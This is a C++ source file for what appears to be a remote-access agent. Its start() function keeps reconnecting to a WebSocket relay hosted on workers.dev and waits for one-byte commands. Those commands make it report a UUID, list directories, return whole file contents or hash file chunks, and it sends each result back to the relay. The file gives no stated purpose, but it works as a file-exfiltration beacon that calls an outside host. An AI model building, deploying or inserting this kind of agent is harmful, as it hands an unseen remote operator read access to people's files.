#include "terminal.h"
#include "runtime.h"
#include "websocket_client.h"
#include "sha2.h"

INT32 start()
{
    auto url = "https://relay.nostdlib.workers.dev/ws"_embed;
while (1)
    {
    LOG_INFO("Creating WebSocket client for URL: %s", (PCCHAR)url);

    auto createResult = WebSocketClient::Create(url);
    if (!createResult)
    {
        LOG_ERROR("Failed to open WebSocket connection to %s", (PCCHAR)url);
        return 0;
    }
    WebSocketClient &wsClient = createResult.Value();
    LOG_INFO("WebSocket connection opened successfully to %s", (PCCHAR)url);

    while (1)
    {
        auto readResult = wsClient.Read();

        if (!readResult.IsOk())
        {
            LOG_ERROR("Failed to read message from WebSocket server");
            break;
        }

        PCHAR command = (PCHAR)(readResult.Value().Data);
        UINT8 commandType = command[0];
        command++;
        USIZE commandLength = readResult.Value().Length - sizeof(UINT8);

        WebSocketOpcode opcode = readResult.Value().Opcode;

        LOG_INFO("Received message (opcode: %d, length: %d)", (INT32)opcode, (INT32)commandLength);

        PCHAR response = nullptr;
        USIZE responseLength = sizeof(UINT32); // Default response length for error code

        void (*commandHandlers[4])(PCHAR, USIZE, PCHAR *, PUSIZE) = {nullptr};

        commandHandlers[CommandType::GetUUID] = EMBED_FUNC(Handle_GetUUIDCommand);
        commandHandlers[CommandType::GetDirectoryContent] = EMBED_FUNC(Handle_GetDirectoryContentCommand);
        commandHandlers[CommandType::GetFileContent] = EMBED_FUNC(Handle_GetFileContentCommand);
        commandHandlers[CommandType::GetFileChunkHash] = EMBED_FUNC(Handle_GetFileChunkHashCommand);

        if (commandType >= CommandType::GetUUID && commandType <= CommandType::GetFileChunkHash)
        {
            commandHandlers[commandType](command, commandLength, &response, &responseLength);
        }
        else
        {
            LOG_ERROR("Unknown command type received: %d", (INT32)commandType);
            response = new CHAR[responseLength]; // Only return error code
            *(PUINT32)response = 2;              // Example error code for unknown command
        }

        auto writeResult = wsClient.Write(Span<const CHAR>(response, responseLength), WebSocketOpcode::Binary);
        if (!writeResult)
        {
            LOG_ERROR("Failed to send response to WebSocket server");
            delete[] response;
            break;
        }
        LOG_INFO("Response sent successfully to WebSocket server (length: %u)", (UINT32)responseLength);
        delete[] response;
        response = nullptr;
        responseLength = 0;
    }
}
    return 1;
}
